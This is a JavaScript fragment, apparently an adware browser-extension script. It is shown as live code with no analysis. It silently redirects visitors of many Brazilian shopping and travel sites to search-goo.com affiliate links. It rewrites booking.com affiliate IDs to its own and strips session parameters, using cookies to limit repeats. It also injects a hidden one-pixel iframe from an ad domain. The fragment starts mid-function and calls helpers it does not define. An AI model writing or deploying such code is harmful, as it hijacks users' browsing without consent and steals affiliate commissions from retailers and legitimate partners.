if (location.href === 'http://www.sephora.com.br/') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=405";
}

if (location.href === 'http://www.nike.com.br/') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=406";
}

if (location.href === 'http://www.hotelurbano.com/') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=397";
}

if (location.href === 'http://www.groupon.com.br/'||location.href ==='https://www.groupon.com.br/') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=394";
}

if (location.href === 'http://www.tam.com.br/'||location.href === 'http://www.tam.com.br/b2c/vgn/v/index.jsp?vgnextoid=97981ed526b72210VgnVCM1000003752070aRCRD') {
	window.location ="https://search-goo.com/redirect/type6u.php?superred=404";
}

if (location.href === 'http://www.casasbahia.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=403";
}

if (location.href === 'http://www.ricardoeletro.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=402";
}

if (location.href === 'http://www.centauro.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=400";
}

if (location.href === 'http://pt.aliexpress.com/'||location.href === 'pt.aliexpress.com/br_home.htm'||location.href === 'http://aliexpress.com/' || location.href === 'http://www.aliexpress.com/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=377";
}

if (location.href === 'http://www.decolar.com/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=380";
}

if (location.href === 'http://www.pontofrio.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=391";
}

if (location.href === 'http://offer.alibaba.com/' || location.href === 'http://www.alibaba.com/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=379";
}

if (location.href === 'http://www.mercadolivre.com.br/') {

	if(getCookie("mlcc")=="empty"){
					
						createCookie("mlcc", 1, 30);
						window.location ="https://search-goo.com/redirect/type4u.php?superred=365";
					}
}

if (location.href === 'http://br.privalia.com/'||location.href === 'http://br.privalia.com/public') {

	if(getCookie("mlcc")=="empty"){
					
						createCookie("mlcc", 1, 120);
						window.location ="https://search-goo.com/redirect/type4u.php?superred=395";
					}
}

if (location.href === 'http://www.walmart.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=387";
}

if (location.href === 'http://www.netshoes.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=366";
}

var endb=Math.floor(Math.random() * (100)) + 1;
if (location.href.indexOf ('www.booking.com')>-1 && location.href.indexOf ('aid=397075')<0 && location.href.indexOf ('aid=813275')<0 && endb>20) {
	var alerta=location.href;
	
	alerta = alerta.replace(/aid=(\d)*/g,"aid=397075");
	alerta = alerta.replace(/label=([^;-;]*|[^&-&]*)/g,"label=sggl");
	alerta = alerta.replace(/sid=([^;-;]*|[^&-&]*)/g,"");
	alerta = alerta.replace(/dcid=([^;-;]*|[^&-&]*)/g,"");
	if (alerta.indexOf ('aid=397075')<0)
		{
		if (alerta.indexOf ('?')<0){alerta=alerta+"?aid=397075&label=splg";}else{alerta=alerta+"&aid=397075&label=splg";}
		}
		
				if(getCookie("mlcc")=="empty"){
					
						createCookie("mlcc", 1, 30);
						window.location =alerta;
					}
	
	
}

if (location.href.indexOf ('www.booking.com')>-1 && location.href.indexOf ('aid=397075')<0 && location.href.indexOf ('aid=813275')<0 && endb<21) {
	var alerta=location.href;
	
	alerta = alerta.replace(/aid=(\d)*/g,"aid=813275");
	alerta = alerta.replace(/label=([^;-;]*|[^&-&]*)/g,"label=sggl");
	alerta = alerta.replace(/sid=([^;-;]*|[^&-&]*)/g,"");
	alerta = alerta.replace(/dcid=([^;-;]*|[^&-&]*)/g,"");
	if (alerta.indexOf ('aid=813275')<0)
		{
		if (alerta.indexOf ('?')<0){alerta=alerta+"?aid=813275&label=splg";}else{alerta=alerta+"&aid=813275&label=splg";}
		}
		
				if(getCookie("mlcc")=="empty"){
					
						createCookie("mlcc", 1, 30);
						window.location =alerta;
					}
	
	
}

if (location.href === 'http://www.submarino.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=388";
	}

if (location.href === 'http://www.americanas.com.br/') {
	window.location ="https://search-goo.com/redirect/type4u.php?superred=389";
	}
	
if (location.href === 'http://tripadvisor.com.br/'||location.href === 'http://www.tripadvisor.com/') {

	if(getCookie("mlcc")=="empty"){
					
						createCookie("mlcc", 1, 30);
						window.location ="https://search-goo.com/redirect/type6u.php?superred=390";
					}
}

}

//comprobamos si es una web hpc con el plugin ya instalado
function gaz(){
document.getElementById('qazdiv').innerHTML = "comprobado";
if (document.getElementById("qazdiv").innerHTML==='comprobado') {
window.location = 'http://wws.'+window.location.hostname.replace(/www./,"");
}
}
try{
gaz()
}
catch(e){
}

function cdl(){
//comprobamos si es una web de libros con el plugin instalado
document.getElementById('controldelibros').innerHTML = "comprobado";
}
try{
cdl()
}
catch(e){
}

if (window.location.hostname=='lelivros.red'>0){
}
else{
	if (document.location.href.indexOf('meteosite.info')>0||document.location.href.indexOf('compradescuento.com')>0||document.location.href.indexOf('medicamentosbrasil.org')>0||document.location.href.indexOf('hotelbook.website')>0||document.location.href.indexOf('empresasdobrasil.link')>0||document.location.href.indexOf('hoteisespanha.info')>0)
	{
	}
	else{
	a_y();
	b_y();
	c_y();
	e_z()
	redaff();
	}
}

if (window.top == window.self)
{
ifrm = document.createElement("iframe");
ifrm.setAttribute("src", "https://yourads.website/banner/check1.html");
ifrm.style.width = 1+"px";
ifrm.style.height = 1+"px";
ifrm.style.display = "none";
document.body.appendChild(ifrm);
}